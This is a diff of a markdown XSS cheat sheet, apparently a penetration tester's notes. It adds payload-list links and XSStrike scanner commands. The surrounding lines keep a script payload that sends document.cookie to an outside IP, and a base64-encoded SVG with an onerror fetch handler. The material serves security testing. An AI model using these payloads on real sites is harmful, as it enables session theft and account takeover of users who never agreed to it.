@@ -5,8 +5,9 @@
 - [CSP evasion with dangling markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
 - [Portswigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
-## Injections
-
+## Payloads
+ - [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+ - [PayloadBox](https://github.com/payloadbox/xss-payload-list)
 ```html
 <script>fetch("http://1.1.1.1/?cookie="+document.cookie);</script>
 ```
@@ -18,6 +19,15 @@
 ```
 ```html
 data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4NCiAgPGNpcmNsZSByPSIxMCIgY3g9IjEwIiBjeT0iMTAiIGZpbGw9ImdyZWVuIi8+DQogIDxpbWFnZSBocmVmPSJ4IiBvbmVycm9yPSJqYXZhc2NyaXB0OmZldGNoKCdzb21ldGhpbmcnKSIgLz4NCjwvc3ZnPg0K
+```
+
+## Discovery
+ - [XSStrike](https://github.com/s0md3v/XSStrike)
+ - [XSSer](https://github.com/epsylon/xsser)
+### XSStrike
+```bash
+git clone https://github.com/s0md3v/XSStrike.git; cd XSStrike; pip install -r requirements.txt;
+python xsstrike.py -u "http://<url>/?paramtotest=xyz&otherparam=42"
 ```
 
 ## JPG CSP Evasion 
